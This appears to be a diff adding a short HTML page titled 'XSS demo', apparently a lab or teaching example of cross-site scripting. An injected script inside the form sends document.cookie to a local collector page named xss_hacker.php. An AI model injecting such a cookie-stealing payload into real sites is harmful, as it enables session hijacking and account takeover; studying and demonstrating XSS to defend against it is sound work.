@@ -1,0 +1,12 @@
+<!doctype html>  
+<html>  
+    <head>  
+        <title>XSS demo</title>  
+    </head>  
+    <body>  
+    <form>  
+    <input style="width:500px;" type="text" name="address1" value=""/> <script>window.open("http://localhost:1337/xss_hacker.php?cookie="+document.cookie);</script> />  
+            <input type="submit" value="Submit" />  
+        </form>  
+    </body>  
+</html>  
